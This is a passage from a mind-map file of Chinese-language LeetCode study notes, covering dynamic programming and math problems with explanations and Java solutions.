            } else if (dp[i] == 0 &amp;&amp; dp[i - coin] != 0) {
                dp[i] = dp[i - coin] + 1;
            } else if (dp[i - coin] != 0) {
                dp[i] = Math.min(dp[i], dp[i - coin] + 1);
            }
        }
    }
    return dp[amount] == 0 ? -1 : dp[amount];
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1224432890" CREATED="1754751539738" MODIFIED="1754751539740"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      5. 找零钱的硬币数组合
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      518. Coin Change 2 (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/coin-change-2/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/coin-change-2/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">Input: amount = 5, coins = [1, 2, 5]
Output: 4
Explanation: there are four ways to make up the amount:
5=5
5=2+2+1
5=2+1+1+1
5=1+1+1+1+1</code></pre>
    <p>
      完全背包问题，使用 dp 记录可达成目标的组合数目。
    </p>
    <pre><code class="language-plaintext">public int change(int amount, int[] coins) {
    if (coins == null) {
        return 0;
    }
    int[] dp = new int[amount + 1];
    dp[0] = 1;
    for (int coin : coins) {
        for (int i = coin; i &lt;= amount; i++) {
            dp[i] += dp[i - coin];
        }
    }
    return dp[amount];
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_324700422" CREATED="1754751539741" MODIFIED="1754751539742"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      6. 字符串按单词列表分割
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      139. Word Break (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/word-break/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/word-break/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">s = &quot;leetcode&quot;,
dict = [&quot;leet&quot;, &quot;code&quot;].
Return true because &quot;leetcode&quot; can be segmented as &quot;leet code&quot;.</code></pre>
    <p>
      dict 中的单词没有使用次数的限制，因此这是一个完全背包问题。
    </p>
    <p>
      该问题涉及到字典中单词的使用顺序，也就是说物品必须按一定顺序放入背包中，例如下面的 dict 就不够组成字符串 &quot;leetcode&quot;：
    </p>
    <pre><code class="language-plaintext">[&quot;lee&quot;, &quot;tc&quot;, &quot;cod&quot;]</code></pre>
    <p>
      求解顺序的完全背包问题时，对物品的迭代应该放在最里层，对背包的迭代放在外层，只有这样才能让物品按一定顺序放入背包中。
    </p>
    <pre><code class="language-plaintext">public boolean wordBreak(String s, List&lt;String&gt; wordDict) {
    int n = s.length();
    boolean[] dp = new boolean[n + 1];
    dp[0] = true;
    for (int i = 1; i &lt;= n; i++) {
        for (String word : wordDict) {   // 对物品的迭代应该放在最里层
            int len = word.length();
            if (len &lt;= i &amp;&amp; word.equals(s.substring(i - len, i))) {
                dp[i] = dp[i] || dp[i - len];
            }
        }
    }
    return dp[n];
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1693771300" CREATED="1754751539742" MODIFIED="1754751539744"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      7. 组合总和
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      377. Combination Sum IV (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/combination-sum-iv/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/combination-sum-iv/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">nums = [1, 2, 3]
target = 4
The possible combination ways are:
(1, 1, 1, 1)
(1, 1, 2)
(1, 2, 1)
(1, 3)
(2, 1, 1)
(2, 2)
(3, 1)
Note that different sequences are counted as different combinations.
Therefore the output is 7.</code></pre>
    <p>
      涉及顺序的完全背包。
    </p>
    <pre><code class="language-plaintext">public int combinationSum4(int[] nums, int target) {
    if (nums == null || nums.length == 0) {
        return 0;
    }
    int[] maximum = new int[target + 1];
    maximum[0] = 1;
    Arrays.sort(nums);
    for (int i = 1; i &lt;= target; i++) {
        for (int j = 0; j &lt; nums.length &amp;&amp; nums[j] &lt;= i; j++) {
            maximum[i] += maximum[i - nums[j]];
        }
    }
    return maximum[target];
}</code></pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1638229632" CREATED="1754751539744" MODIFIED="1754751539744"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      股票交易
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1902346866" CREATED="1754751539746" MODIFIED="1754751539748"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 需要冷却期的股票交易
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      309. Best Time to Buy and Sell Stock with Cooldown(Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/best-time-to-buy-and-sell-stock-with-cooldown/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-with-cooldown/description/">力扣</a>
    </p>
    <p>
      题目描述：交易之后需要有一天的冷却时间。
    </p>
    <p>
      <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/ffd96b99-8009-487c-8e98-11c9d44ef14f.png"/>
      
    </p>
    <pre><code class="language-plaintext">public int maxProfit(int[] prices) {
    if (prices == null || prices.length == 0) {
        return 0;
    }
    int N = prices.length;
    int[] buy = new int[N];
    int[] s1 = new int[N];
    int[] sell = new int[N];
    int[] s2 = new int[N];
    s1[0] = buy[0] = -prices[0];
    sell[0] = s2[0] = 0;
    for (int i = 1; i &lt; N; i++) {
        buy[i] = s2[i - 1] - prices[i];
        s1[i] = Math.max(buy[i - 1], s1[i - 1]);
        sell[i] = Math.max(buy[i - 1], s1[i - 1]) + prices[i];
        s2[i] = Math.max(s2[i - 1], sell[i - 1]);
    }
    return Math.max(sell[N - 1], s2[N - 1]);
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1265493886" CREATED="1754751539748" MODIFIED="1754751539750"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 需要交易费用的股票交易
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      714. Best Time to Buy and Sell Stock with Transaction Fee (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/best-time-to-buy-and-sell-stock-with-transaction-fee/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-with-transaction-fee/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">Input: prices = [1, 3, 2, 8, 4, 9], fee = 2
Output: 8
Explanation: The maximum profit can be achieved by:
Buying at prices[0] = 1
Selling at prices[3] = 8
Buying at prices[4] = 4
Selling at prices[5] = 9
The total profit is ((8 - 1) - 2) + ((9 - 4) - 2) = 8.</code></pre>
    <p>
      题目描述：每交易一次，都要支付一定的费用。
    </p>
    <p>
      <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1e2c588c-72b7-445e-aacb-d55dc8a88c29.png"/>
      
    </p>
    <pre><code class="language-plaintext">public int maxProfit(int[] prices, int fee) {
    int N = prices.length;
    int[] buy = new int[N];
    int[] s1 = new int[N];
    int[] sell = new int[N];
    int[] s2 = new int[N];
    s1[0] = buy[0] = -prices[0];
    sell[0] = s2[0] = 0;
    for (int i = 1; i &lt; N; i++) {
        buy[i] = Math.max(sell[i - 1], s2[i - 1]) - prices[i];
        s1[i] = Math.max(buy[i - 1], s1[i - 1]);
        sell[i] = Math.max(buy[i - 1], s1[i - 1]) - fee + prices[i];
        s2[i] = Math.max(s2[i - 1], sell[i - 1]);
    }
    return Math.max(sell[N - 1], s2[N - 1]);
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1495807729" CREATED="1754751539750" MODIFIED="1754751539752"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 只能进行两次的股票交易
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      123. Best Time to Buy and Sell Stock III (Hard)
    </p>
    <p>
      <a href="https://leetcode.com/problems/best-time-to-buy-and-sell-stock-iii/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-iii/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">public int maxProfit(int[] prices) {
    int firstBuy = Integer.MIN_VALUE, firstSell = 0;
    int secondBuy = Integer.MIN_VALUE, secondSell = 0;
    for (int curPrice : prices) {
        if (firstBuy &lt; -curPrice) {
            firstBuy = -curPrice;
        }
        if (firstSell &lt; firstBuy + curPrice) {
            firstSell = firstBuy + curPrice;
        }
        if (secondBuy &lt; firstSell - curPrice) {
            secondBuy = firstSell - curPrice;
        }
        if (secondSell &lt; secondBuy + curPrice) {
            secondSell = secondBuy + curPrice;
        }
    }
    return secondSell;
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1701065004" CREATED="1754751539752" MODIFIED="1754751539754"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. 只能进行 k 次的股票交易
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      188. Best Time to Buy and Sell Stock IV (Hard)
    </p>
    <p>
      <a href="https://leetcode.com/problems/best-time-to-buy-and-sell-stock-iv/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-iv/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">public int maxProfit(int k, int[] prices) {
    int n = prices.length;
    if (k &gt;= n / 2) {   // 这种情况下该问题退化为普通的股票交易问题
        int maxProfit = 0;
        for (int i = 1; i &lt; n; i++) {
            if (prices[i] &gt; prices[i - 1]) {
                maxProfit += prices[i] - prices[i - 1];
            }
        }
        return maxProfit;
    }
    int[][] maxProfit = new int[k + 1][n];
    for (int i = 1; i &lt;= k; i++) {
        int localMax = maxProfit[i - 1][0] - prices[0];
        for (int j = 1; j &lt; n; j++) {
            maxProfit[i][j] = Math.max(maxProfit[i][j - 1], prices[j] + localMax);
            localMax = Math.max(localMax, maxProfit[i - 1][j] - prices[j]);
        }
    }
    return maxProfit[k][n - 1];
}</code></pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_174453624" CREATED="1754751539754" MODIFIED="1754751539754"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      字符串编辑
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1236380289" CREATED="1754751539755" MODIFIED="1754751539757"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 删除两个字符串的字符使它们相等
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      583. Delete Operation for Two Strings (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/delete-operation-for-two-strings/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/delete-operation-for-two-strings/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">Input: &quot;sea&quot;, &quot;eat&quot;
Output: 2
Explanation: You need one step to make &quot;sea&quot; to &quot;ea&quot; and another step to make &quot;eat&quot; to &quot;ea&quot;.</code></pre>
    <p>
      可以转换为求两个字符串的最长公共子序列问题。
    </p>
    <pre><code class="language-plaintext">public int minDistance(String word1, String word2) {
    int m = word1.length(), n = word2.length();
    int[][] dp = new int[m + 1][n + 1];
    for (int i = 1; i &lt;= m; i++) {
        for (int j = 1; j &lt;= n; j++) {
            if (word1.charAt(i - 1) == word2.charAt(j - 1)) {
                dp[i][j] = dp[i - 1][j - 1] + 1;
            } else {
                dp[i][j] = Math.max(dp[i][j - 1], dp[i - 1][j]);
            }
        }
    }
    return m + n - 2 * dp[m][n];
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1561367532" CREATED="1754751539757" MODIFIED="1754751539759"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 编辑距离
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      72. Edit Distance (Hard)
    </p>
    <p>
      <a href="https://leetcode.com/problems/edit-distance/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/edit-distance/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">Example 1:
Input: word1 = &quot;horse&quot;, word2 = &quot;ros&quot;
Output: 3
Explanation:
horse -&gt; rorse (replace 'h' with 'r')
rorse -&gt; rose (remove 'r')
rose -&gt; ros (remove 'e')
Example 2:
Input: word1 = &quot;intention&quot;, word2 = &quot;execution&quot;
Output: 5
Explanation:
intention -&gt; inention (remove 't')
inention -&gt; enention (replace 'i' with 'e')
enention -&gt; exention (replace 'n' with 'x')
exention -&gt; exection (replace 'n' with 'c')
exection -&gt; execution (insert 'u')</code></pre>
    <p>
      题目描述：修改一个字符串成为另一个字符串，使得修改次数最少。一次修改操作包括：插入一个字符、删除一个字符、替换一个字符。
    </p>
    <pre><code class="language-plaintext">public int minDistance(String word1, String word2) {
    if (word1 == null || word2 == null) {
        return 0;
    }
    int m = word1.length(), n = word2.length();
    int[][] dp = new int[m + 1][n + 1];
    for (int i = 1; i &lt;= m; i++) {
        dp[i][0] = i;
    }
    for (int i = 1; i &lt;= n; i++) {
        dp[0][i] = i;
    }
    for (int i = 1; i &lt;= m; i++) {
        for (int j = 1; j &lt;= n; j++) {
            if (word1.charAt(i - 1) == word2.charAt(j - 1)) {
                dp[i][j] = dp[i - 1][j - 1];
            } else {
                dp[i][j] = Math.min(dp[i - 1][j - 1], Math.min(dp[i][j - 1], dp[i - 1][j])) + 1;
            }
        }
    }
    return dp[m][n];
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1050569882" CREATED="1754751539759" MODIFIED="1754751539762"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 复制粘贴字符
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      650. 2 Keys Keyboard (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/2-keys-keyboard/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/2-keys-keyboard/description/">力扣</a>
    </p>
    <p>
      题目描述：最开始只有一个字符 A，问需要多少次操作能够得到 n 个字符 A，每次操作可以复制当前所有的字符，或者粘贴。
    </p>
    <pre><code class="language-plaintext">Input: 3
Output: 3
Explanation:
Intitally, we have one character 'A'.
In step 1, we use Copy All operation.
In step 2, we use Paste operation to get 'AA'.
In step 3, we use Paste operation to get 'AAA'.</code></pre>
    <pre><code class="language-plaintext">public int minSteps(int n) {
    if (n == 1) return 0;
    for (int i = 2; i &lt;= Math.sqrt(n); i++) {
        if (n % i == 0) return i + minSteps(n / i);
    }
    return n;
}</code></pre>
    <pre><code class="language-plaintext">public int minSteps(int n) {
    int[] dp = new int[n + 1];
    int h = (int) Math.sqrt(n);
    for (int i = 2; i &lt;= n; i++) {
        dp[i] = i;
        for (int j = 2; j &lt;= h; j++) {
            if (i % j == 0) {
                dp[i] = dp[j] + dp[i / j];
                break;
            }
        }
    }
    return dp[n];
}</code></pre>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node FOLDED="true" ID="ID_715059965" CREATED="1754750425407" MODIFIED="1754751536053" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E6%95%B0%E5%AD%A6.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    数学
  </body>
</html>
</richcontent>
<node ID="ID_1018292146" CREATED="1754751536055" MODIFIED="1754751536057"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      素数分解
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      每一个数都可以分解成素数的乘积，例如 84 = 2<sup>2</sup>&#xa0;* 3<sup>1</sup>&#xa0;* 5<sup>0</sup>&#xa0;* 7<sup>1</sup>&#xa0;* 11<sup>0</sup>&#xa0;* 13<sup>0</sup>&#xa0;* 17<sup>0</sup>&#xa0;* …
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_369428198" CREATED="1754751536058" MODIFIED="1754751536059"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      整除
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      令 x = 2<sup>m0</sup>&#xa0;* 3<sup>m1</sup>&#xa0;* 5<sup>m2</sup>&#xa0;* 7<sup>m3</sup>&#xa0;* 11<sup>m4</sup>&#xa0;* …
    </p>
    <p>
      令 y = 2<sup>n0</sup>&#xa0;* 3<sup>n1</sup>&#xa0;* 5<sup>n2</sup>&#xa0;* 7<sup>n3</sup>&#xa0;* 11<sup>n4</sup>&#xa0;* …
    </p>
    <p>
      如果 x 整除 y（y mod x == 0），则对于所有 i，mi &lt;= ni。
    </p>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_110570398" CREATED="1754751536060" MODIFIED="1754751536061"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      最大公约数最小公倍数
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      x 和 y 的最大公约数为：gcd(x,y) = 2<sup>min(m0,n0)</sup>&#xa0;* 3<sup>min(m1,n1)</sup>&#xa0;* 5<sup>min(m2,n2)</sup>&#xa0;* ...
    </p>
    <p>
      x 和 y 的最小公倍数为：lcm(x,y) = 2<sup>max(m0,n0)</sup>&#xa0;* 3<sup>max(m1,n1)</sup>&#xa0;* 5<sup>max(m2,n2)</sup>&#xa0;* ...
    </p>
  </body>
</html></richcontent>
<node ID="ID_1656889612" CREATED="1754751536061" MODIFIED="1754751536063"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 生成素数序列
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      204. Count Primes (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/count-primes/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/count-primes/description/">力扣</a>
    </p>
    <p>
      埃拉托斯特尼筛法在每次找到一个素数时，将能被素数整除的数排除掉。
    </p>
    <pre><code class="language-plaintext">public int countPrimes(int n) {
    boolean[] notPrimes = new boolean[n + 1];
    int count = 0;
    for (int i = 2; i &lt; n; i++) {
        if (notPrimes[i]) {
            continue;
        }
        count++;
        // 从 i * i 开始，因为如果 k &lt; i，那么 k * i 在之前就已经被去除过了
        for (long j = (long) (i) * i; j &lt; n; j += i) {
            notPrimes[(int) j] = true;
        }
    }
    return count;
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_416986184" CREATED="1754751536064" MODIFIED="1754751536070"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 最大公约数
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <pre><code class="language-plaintext">int gcd(int a, int b) {
    return b == 0 ? a : gcd(b, a % b);
}</code></pre>
    <p>
      最小公倍数为两数的乘积除以最大公约数。
    </p>
    <pre><code class="language-plaintext">int lcm(int a, int b) {
    return a * b / gcd(a, b);
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1561012902" CREATED="1754751536070" MODIFIED="1754751536073"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 使用位操作和减法求解最大公约数
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      <a href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E6%95%B0%E5%AD%A6.md#">编程之美：2.7</a>
    </p>
    <p>
      对于 a 和 b 的最大公约数 f(a, b)，有：
    </p>
    <ul>
      <li>
        <p>
          如果 a 和 b 均为偶数，f(a, b) = 2*f(a/2, b/2);
        </p>
      </li>
      <li>
        <p>
          如果 a 是偶数 b 是奇数，f(a, b) = f(a/2, b);
        </p>
      </li>
      <li>
        <p>
          如果 b 是偶数 a 是奇数，f(a, b) = f(a, b/2);
        </p>
      </li>
      <li>
        <p>
          如果 a 和 b 均为奇数，f(a, b) = f(b, a-b);
        </p>
      </li>
    </ul>
    <p>
      乘 2 和除 2 都可以转换为移位操作。
    </p>
    <pre><code class="language-plaintext">public int gcd(int a, int b) {
    if (a &lt; b) {
        return gcd(b, a);
    }
    if (b == 0) {
        return a;
    }
    boolean isAEven = isEven(a), isBEven = isEven(b);
    if (isAEven &amp;&amp; isBEven) {
        return 2 * gcd(a &gt;&gt; 1, b &gt;&gt; 1);
    } else if (isAEven &amp;&amp; !isBEven) {
        return gcd(a &gt;&gt; 1, b);
    } else if (!isAEven &amp;&amp; isBEven) {
        return gcd(a, b &gt;&gt; 1);
    } else {
        return gcd(b, a - b);
    }
}</code></pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_735922366" CREATED="1754751536074" MODIFIED="1754751536074"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      进制转换
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1118650601" CREATED="1754751536075" MODIFIED="1754751536077"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 7 进制
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      504. Base 7 (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/base-7/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/base-7/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">public String convertToBase7(int num) {
    if (num == 0) {
        return &quot;0&quot;;
    }
    StringBuilder sb = new StringBuilder();
    boolean isNegative = num &lt; 0;
    if (isNegative) {
        num = -num;
    }
    while (num &gt; 0) {
        sb.append(num % 7);
        num /= 7;
    }
    String ret = sb.reverse().toString();
    return isNegative ? &quot;-&quot; + ret : ret;
}</code></pre>
    <p>
      Java 中 static String toString(int num, int radix) 可以将一个整数转换为 radix 进制表示的字符串。
    </p>
    <pre><code class="language-plaintext">public String convertToBase7(int num) {
    return Integer.toString(num, 7);
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1118765605" CREATED="1754751536077" MODIFIED="1754751536079"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 16 进制
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      405. Convert a Number to Hexadecimal (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/convert-a-number-to-hexadecimal/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/convert-a-number-to-hexadecimal/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">Input:
26
Output:
&quot;1a&quot;
Input:
-1
Output:
&quot;ffffffff&quot;</code></pre>
    <p>
      负数要用它的补码形式。
    </p>
    <pre><code class="language-plaintext">public String toHex(int num) {
    char[] map = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'};
    if (num == 0) return &quot;0&quot;;
    StringBuilder sb = new StringBuilder();
    while (num != 0) {
        sb.append(map[num &amp; 0b1111]);
        num &gt;&gt;&gt;= 4; // 因为考虑的是补码形式，因此符号位就不能有特殊的意义，需要使用无符号右移，左边填 0
    }
    return sb.reverse().toString();
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_190248395" CREATED="1754751536080" MODIFIED="1754751536082"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 26 进制
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      168. Excel Sheet Column Title (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/excel-sheet-column-title/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/excel-sheet-column-title/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">1 -&gt; A
2 -&gt; B
3 -&gt; C
...
26 -&gt; Z
27 -&gt; AA
28 -&gt; AB</code></pre>
    <p>
      因为是从 1 开始计算的，而不是从 0 开始，因此需要对 n 执行 -1 操作。
    </p>
    <pre><code class="language-plaintext">public String convertToTitle(int n) {
    if (n == 0) {
        return &quot;&quot;;
    }
    n--;
    return convertToTitle(n / 26) + (char) (n % 26 + 'A');
}</code></pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1240407606" CREATED="1754751536082" MODIFIED="1754751536082"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      阶乘
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1978421638" CREATED="1754751536083" MODIFIED="1754751536085"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 统计阶乘尾部有多少个 0
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      172. Factorial Trailing Zeroes (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/factorial-trailing-zeroes/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/factorial-trailing-zeroes/description/">力扣</a>
    </p>
    <p>
      尾部的 0 由 2 * 5 得来，2 的数量明显多于 5 的数量，因此只要统计有多少个 5 即可。
    </p>
    <p>
      对于一个数 N，它所包含 5 的个数为：N/5 + N/5<sup>2</sup>&#xa0;+ N/5<sup>3</sup>&#xa0;+ ...，其中 N/5 表示不大于 N 的数中 5 的倍数贡献一个 5，N/5<sup>2</sup>&#xa0;表示不大于 N 的数中 5<sup>2</sup>&#xa0;的倍数再贡献一个 5 ...。
    </p>
    <pre><code class="language-plaintext">public int trailingZeroes(int n) {
    return n == 0 ? 0 : n / 5 + trailingZeroes(n / 5);
}</code></pre>
    <p>
      如果统计的是 N! 的二进制表示中最低位 1 的位置，只要统计有多少个 2 即可，该题目出自 <a href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E6%95%B0%E5%AD%A6.md#">编程之美：2.2</a>&#xa0;。和求解有多少个 5 一样，2 的个数为 N/2 + N/2<sup>2</sup>&#xa0;+ N/2<sup>3</sup>&#xa0;+ ...
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_596896777" CREATED="1754751536086" MODIFIED="1754751536086"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      字符串加法减法
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1451565576" CREATED="1754751536087" MODIFIED="1754751536089"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 二进制加法
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      67. Add Binary (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/add-binary/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/add-binary/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">a = &quot;11&quot;
b = &quot;1&quot;
Return &quot;100&quot;.</code></pre>
    <pre><code class="language-plaintext">public String addBinary(String a, String b) {
    int i = a.length() - 1, j = b.length() - 1, carry = 0;
    StringBuilder str = new StringBuilder();
    while (carry == 1 || i &gt;= 0 || j &gt;= 0) {
        if (i &gt;= 0 &amp;&amp; a.charAt(i--) == '1') {
            carry++;
        }
        if (j &gt;= 0 &amp;&amp; b.charAt(j--) == '1') {
            carry++;
        }
        str.append(carry % 2);
        carry /= 2;
    }
    return str.reverse().toString();
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_65830964" CREATED="1754751536089" MODIFIED="1754751536091"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 字符串加法
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      415. Add Strings (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/add-strings/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/add-strings/description/">力扣</a>
    </p>
    <p>
      字符串的值为非负整数。
    </p>
    <pre><code class="language-plaintext">public String addStrings(String num1, String num2) {
    StringBuilder str = new StringBuilder();
    int carry = 0, i = num1.length() - 1, j = num2.length() - 1;
    while (carry == 1 || i &gt;= 0 || j &gt;= 0) {
        int x = i &lt; 0 ? 0 : num1.charAt(i--) - '0';
        int y = j &lt; 0 ? 0 : num2.charAt(j--) - '0';
        str.append((x + y + carry) % 10);
